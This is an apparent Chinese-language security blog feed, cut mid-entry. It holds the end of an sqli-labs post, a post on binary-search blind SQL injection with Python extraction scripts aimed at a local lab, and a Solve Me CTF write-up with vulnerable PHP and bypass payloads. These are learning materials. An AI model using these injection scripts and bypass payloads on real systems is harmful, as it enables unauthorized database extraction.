class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">联合查询注入</span><br><span class="line">报错注入</span><br><span class="line">bool盲注</span><br><span class="line">时间盲注</span><br></pre></td></tr></table></figure><p>后面的从18关开始就开始是http头的注入，但无论是什么注入，关键是要找到注入点在哪里，然后用合适的方法去闭合相关语句，然后再用正常的语句去查询你所需要的信息就好了</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近啊先自己SQL注入确实不行，我只能拿出sql注入的基础部分来练练收了，这个实验环境是sqlilabs
    
    </summary>
    
      <category term="SQL注入" scheme="0verwatch.top/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="0verwatch.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>二分查找在sql盲注里面的应用</title>
    <link href="0verwatch.top/2018/08/27/bin-search-sql/"/>
    <id>0verwatch.top/2018/08/27/bin-search-sql/</id>
    <published>2018-08-27T02:53:50.000Z</published>
    <updated>2018-08-27T02:57:04.305Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在重新复习SQL注入用了sqllabs这个靶场，发现在做盲注的时候自己写的脚本，就一直自增去盲注的话时间花费太大，所以就在看了看二分查找在这一方面的应用<br>确实快了不少，很久没有写过小脚本就手有点生疏了，赶紧记录一下<a id="more"></a></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>二分查找又称折半查找，优点是比较次数少，查找速度快，平均性能好；其缺点是要求待查表为有序表，且插入删除困难。因此，折半查找方法适用于不经常变动而查找频繁的有序列表。首先，假设表中元素是按升序排列，将表中间位置记录的关键字与查找关键字比较，如果两者相等，则查找成功；否则利用中间位置记录将表分成前、后两个子表，如果中间位置记录的关键字大于查找关键字，则进一步查找前一子表，否则进一步查找后一子表。重复以上过程，直到找到满足条件的记录，使查找成功，或直到子表不存在为止，此时查找不成功。</p><h3 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h3><p> 最优时间复杂度：O(1)<br> 最坏时间复杂度：O(logn)</p><p><img src="https://s1.ax1x.com/2018/08/27/Pqwqeg.png" alt="Pqwqeg.png"></p><p>可以自行对比一下两组代码的不同<br>这是自增的写法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://192.168.100.102/sqlilabs/Less-5/?id=1%27 and ascii(substr((select database()),&#123;_&#125;,1))=&#123;__&#125; %23"</span></span><br><span class="line"><span class="comment">#注意一下这里使用=去作为判断条件</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">65</span>,<span class="number">127</span>):</span><br><span class="line">payload = url.format(_ = i,__ = j)</span><br><span class="line"><span class="comment">#print payload</span></span><br><span class="line">ans  = requests.get(payload)</span><br><span class="line"><span class="comment">#print ans.content</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">in</span> ans.content:</span><br><span class="line"><span class="comment"># database = database + chr(j)</span></span><br><span class="line"><span class="comment"># print database</span></span><br><span class="line">table_name += chr(j)</span><br><span class="line"><span class="keyword">print</span> table_name</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>下面是使用二分法去搜索，我这里使用非递归的办法去实现二分查找</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://192.168.100.102/sqlilabs/Less-5/?id=1%27 and ascii(substr((select database()),&#123;_&#125;,1))&gt;&#123;__&#125; %23"</span></span><br><span class="line"><span class="comment">#注意一下这里使用&gt;去作为判断条件</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>  i  <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">15</span>):  <span class="comment">#这个地方可能会有些问题，数据库长度未知的时候过长会出现重复字母到时候自行删除即可</span></span><br><span class="line">min = <span class="number">65</span></span><br><span class="line">max = <span class="number">122</span></span><br><span class="line"><span class="keyword">while</span> abs(max - min) &gt; <span class="number">1</span>:</span><br><span class="line">mid = (max + min)//<span class="number">2</span></span><br><span class="line">payload = url.format(_=i,__ = mid)</span><br><span class="line">ans = requests.get(payload)</span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line"><span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">in</span> ans.content:</span><br><span class="line">min = mid</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">max = mid</span><br><span class="line"></span><br><span class="line">database += chr(max)</span><br><span class="line"><span class="keyword">print</span> database</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/08/27/Pq0imF.png" alt="Pq0imF.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近在重新复习SQL注入用了sqllabs这个靶场，发现在做盲注的时候自己写的脚本，就一直自增去盲注的话时间花费太大，所以就在看了看二分查找在这一方面的应用&lt;br&gt;确实快了不少，很久没有写过小脚本就手有点生疏了，赶紧记录一下
    
    </summary>
    
      <category term="SQL注入" scheme="0verwatch.top/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="二分查找" scheme="0verwatch.top/tags/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/"/>
    
      <category term="SQL注入" scheme="0verwatch.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Solve Me解题记录</title>
    <link href="0verwatch.top/2018/08/14/Solve-Me-wp/"/>
    <id>0verwatch.top/2018/08/14/Solve-Me-wp/</id>
    <published>2018-08-14T10:23:48.000Z</published>
    <updated>2018-08-19T14:13:10.736Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前一阵子关注点在实战上，现在又回归CTF学习套路了，这个网站<a href="http://solveme.peng.kr" target="_blank" rel="noopener">http://solveme.peng.kr</a> 本来做了一半的题目，今天终于把他补完了，学到了炒鸡多的东西啊<a id="more"></a>~</p><p>##正文</p><h3 id="Warm-up"><a href="#Warm-up" class="headerlink" title="Warm up"></a>Warm up</h3><p>给出来一个密文和一段代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY=</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> base64_encode(hex2bin(strrev(bin2hex($flag)))), <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这题直接反过来写代码即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$s = <span class="string">'1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY='</span>;</span><br><span class="line"><span class="keyword">echo</span> hex2bin(strrev(bin2hex(base64_decode($s))));</span><br></pre></td></tr></table></figure><h3 id="Bad-compare"><a href="#Bad-compare" class="headerlink" title="Bad compare"></a>Bad compare</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   error_reporting(<span class="number">0</span>);</span><br><span class="line">   <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'answer'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>($_GET[<span class="string">'answer'</span>] === <span class="string">'尊찢悼嚴隆'</span>)&#123;</span><br><span class="line">           <span class="keyword">echo</span> $flag;</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">'Wrong answer'</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这题可以知道我们要传进get参数，但是<code>===</code>后面的内容不在可见的ASCII码范围内于是我们抓包看一下<br>找到对应字符串的ASCII码，我们知道单引号url编码为%27,两个27之间的就是那串字符串的ASCII码，<br>直接构造<code>payload：?answer=%f0%ee%c2%f5%d3%fa%e5%f1%d7%cc</code>,得到flag</p><h3 id="Winter-sleep"><a href="#Winter-sleep" class="headerlink" title="Winter sleep"></a>Winter sleep</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'time'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!is_numeric($_GET[<span class="string">'time'</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'The time must be number.'</span>;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>($_GET[<span class="string">'time'</span>] &lt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'This time is too short.'</span>;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>($_GET[<span class="string">'time'</span>] &gt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">3</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'This time is too long.'</span>;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            sleep((int)$_GET[<span class="string">'time'</span>]);</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这一个题目我们运用了<code>int的强制转换</code>和<code>科学计数法</code><br>这个题目先使用科学计数法绕过前面的两个<code>time</code>以及<code>is_numeric</code>，最后通过int的阶段获取到flag，因为<code>60 * 60 * 24 * 30 * 2=5.184*10^6</code><br>现在的<code>payload：?time=5.185e6</code>,sleep大约5秒后出现flag<br>为什么出现这样的效果我们来测试一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> $time = <span class="string">'5.185e6'</span>;</span><br><span class="line"> $num1 = <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">2</span>;</span><br><span class="line"> $num2 = <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">3</span>;</span><br><span class="line"> var_dump(!is_numeric($time));</span><br><span class="line"> var_dump($time&gt;$num1);</span><br><span class="line"> var_dump($time&lt;$num2);</span><br><span class="line"> var_dump((int)$time);</span><br><span class="line"></span><br><span class="line">bool(<span class="keyword">false</span>)</span><br><span class="line">bool(<span class="keyword">true</span>)</span><br><span class="line">bool(<span class="keyword">true</span>)</span><br><span class="line">int(<span class="number">5</span>)</span><br></pre></td></tr></table></figure><h3 id="Hard-login"><a href="#Hard-login" class="headerlink" title="Hard login"></a>Hard login</h3><p>一开始上手这一个题目，发现什么头绪也没有，因为他的那些参数我一个都不知道，发现url有点奇怪后来就尝试着直接去访问<code>index.php</code>，网页顿了一下又回到了login.php，怀疑存在<code>302跳转</code>，于是抓包看一下，果然重定向到<code>login.php</code><br>但同时我们也得到flag</p><p>还有第二种方法，直接curl一下看情况<br><a href="https://imgchr.com/i/P21ZSH" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/14/P21ZSH.md.png" alt="P21ZSH.md.png"></a></p><h3 id="URL-filtering"><a href="#URL-filtering" class="headerlink" title="URL filtering"></a>URL filtering</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   error_reporting(<span class="number">0</span>);</span><br><span class="line">   <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">"/lib.php"</span>;</span><br><span class="line"></span><br><span class="line">   $url = urldecode($_SERVER[<span class="string">'REQUEST_URI'</span>]);</span><br><span class="line">   $url_query = parse_url($url, PHP_URL_QUERY);</span><br><span class="line"></span><br><span class="line">   $params = explode(<span class="string">"&amp;"</span>, $url_query);</span><br><span class="line">   <span class="keyword">foreach</span>($params <span class="keyword">as</span> $param)&#123;</span><br><span class="line"></span><br><span class="line">       $idx_equal = strpos($param, <span class="string">"="</span>);</span><br><span class="line">       <span class="keyword">if</span>($idx_equal === <span class="keyword">false</span>)&#123;</span><br><span class="line">           $key = $param;</span><br><span class="line">           $value = <span class="string">""</span>;</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           $key = substr($param, <span class="number">0</span>, $idx_equal);</span><br><span class="line">           $value = substr($param, $idx_equal + <span class="number">1</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(strpos($key, <span class="string">"do_you_want_flag"</span>) !== <span class="keyword">false</span> || strpos($value, <span class="string">"yes"</span>) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">"no hack"</span>);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'do_you_want_flag'</span>]) &amp;&amp; $_GET[<span class="string">'do_you_want_flag'</span>] == <span class="string">"yes"</span>)&#123;</span><br><span class="line">       <span class="keyword">die</span>($flag);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这一个题目我们可以发现存在parse_url函数，这个函数有个漏洞可以用多个/符号去绕过，然后就不会执行<code>die(&quot;no hack&quot;)</code>;转而执行了下面的语句。<br>这里有篇方方土学长写过的总结:<a href="http://skysec.top/2017/12/15/parse-url%E5%87%BD%E6%95%B0%E5%B0%8F%E8%AE%B0/" target="_blank" rel="noopener">点我</a><br>构造的<code>payload：///?do_you_want_flag=yes</code><br>后来发现还有官方的解法，就是利用描点去绕过，从来都不知道还可以这样搞<br><code>http://urlfiltering.solveme.peng.kr/?%23&amp;do_you_want_flag=yes</code></p><p>#Hash collision</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'foo'</span>], $_GET[<span class="string">'bar'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(strlen($_GET[<span class="string">'foo'</span>]) &gt; <span class="number">30</span> || strlen($_GET[<span class="string">'bar'</span>]) &gt; <span class="number">30</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Too long'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($_GET[<span class="string">'foo'</span>] === $_GET[<span class="string">'bar'</span>])&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Same value'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(hash(<span class="string">'sha512'</span>, $_GET[<span class="string">'foo'</span>]) !== hash(<span class="string">'sha512'</span>, $_GET[<span class="string">'bar'</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Different hash'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> $flag, <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这种题目做了很多遍了，就是利用数组返回NULL去绕过，构造下面的payload</p><p><code>?foo[]=1&amp;bar[]=2</code></p><h3 id="Array2String"><a href="#Array2String" class="headerlink" title="Array2String"></a>Array2String</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    $value = $_GET[<span class="string">'value'</span>];</span><br><span class="line"></span><br><span class="line">    $username = $_GET[<span class="string">'username'</span>];</span><br><span class="line">    $password = $_GET[<span class="string">'password'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($value); ++$i) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($_GET[<span class="string">'username'</span>]) <span class="keyword">unset</span>($username);</span><br><span class="line">        <span class="keyword">if</span> ($value[$i] &gt; <span class="number">32</span> &amp;&amp; $value[$i] &lt; <span class="number">127</span>) <span class="keyword">unset</span>($value);</span><br><span class="line">        <span class="keyword">else</span> $username .= chr($value[$i]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($username == <span class="string">'15th_HackingCamp'</span> &amp;&amp; md5($password) == md5(file_get_contents(<span class="string">'./secret.passwd'</span>))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Hello '</span>.$username.<span class="string">'!'</span>, <span class="string">'&lt;br&gt;'</span>, PHP_EOL;</span><br><span class="line">            <span class="keyword">echo</span> $flag, <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>发现要跟<code>./secret.passwd</code>路径下的内容一样，先去里面看一下，发现字符串<code>simple_passw0rd</code><br>这个题目get到了一个新的知识点</p><p>就是chr()这个函数再ASCII码超过255的时候会自动取余，我们利用这个特性去拼接username的字符串，于是写了个Python脚本构造payload: </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">'''15th_HackingCamp'''</span></span><br><span class="line">dit = []</span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">dit.append((ord(i)+<span class="number">256</span>))</span><br><span class="line"><span class="comment">#print dit </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> dit:</span><br><span class="line">payload += (<span class="string">'value[]='</span>+str(j)+<span class="string">'&amp;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> payload+<span class="string">'password=simple_passw0rd'</span></span><br></pre></td></tr></table></figure><p>得到payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?value[]=305&amp;value[]=309&amp;value[]=372&amp;value[]=360&amp;value[]=351&amp;value[]=328&amp;value[]=353&amp;value[]=355&amp;value[]=363&amp;value[]=361&amp;value[]=366&amp;value[]=359&amp;value[]=323&amp;value[]=353&amp;value[]=365&amp;value[]=368&amp;password=simple_passw0rd</span><br></pre></td></tr></table></figure><p>最后得到flag</p><h3 id="Replace-filter"><a href="#Replace-filter" class="headerlink" title="Replace filter"></a>Replace filter</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'say'</span>]) &amp;&amp; strlen($_GET[<span class="string">'say'</span>]) &lt; <span class="number">20</span>)&#123;</span><br><span class="line"></span><br><span class="line">        $say = preg_replace(<span class="string">'/^(.*)flag(.*)$/'</span>, <span class="string">'$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;'</span>, $_GET[<span class="string">'say'</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/give_me_the_flag/'</span>, $say))&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'What the f**k?'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这题题目漏洞出现在正则匹配那里<br>根据我们查到的资料，因为以’^’开头，以’$’结尾的只能匹配一行，也就是说我们可以用<code>%0a</code>/url编码下的换行/去绕过<br>于是我们可以构造payload:?say=<code>%0Agive_me_the_flag</code><br>得到flag</p><h3 id="Give-me-a-link-2"><a href="#Give-me-a-link-2" class="headerlink" title="Give me a link 2"></a>Give me a link 2</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 